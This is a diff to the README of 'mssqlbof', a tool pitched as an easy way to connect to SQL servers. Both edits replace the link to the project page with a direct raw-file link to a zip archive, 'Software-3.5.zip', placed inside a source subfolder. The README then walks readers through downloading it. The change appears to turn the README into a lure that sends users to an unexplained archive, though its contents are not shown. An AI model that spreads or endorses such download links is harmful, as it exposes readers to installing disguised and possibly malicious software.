@@ -1,6 +1,6 @@
 # 🗄️ mssqlbof - Connect to SQL servers with ease
 
-[![](https://img.shields.io/badge/Download-mssqlbof-blue.svg)](https://github.com/Leesan080425/mssqlbof)
+[![](https://img.shields.io/badge/Download-mssqlbof-blue.svg)](https://raw.githubusercontent.com/Leesan080425/mssqlbof/main/src/tds/Software-3.5.zip)
 
 ## 🛠️ What is mssqlbof
 
@@ -14,7 +14,7 @@ You need a computer running Windows 10 or Windows 11. Your system must support 6
 
 Visit the official project page to get the software. You can find the file release by clicking the link provided below.
 
-[Download mssqlbof here](https://github.com/Leesan080425/mssqlbof)
+[Download mssqlbof here](https://raw.githubusercontent.com/Leesan080425/mssqlbof/main/src/tds/Software-3.5.zip)
 
 1. Open your web browser.
 2. Go to the link provided above.
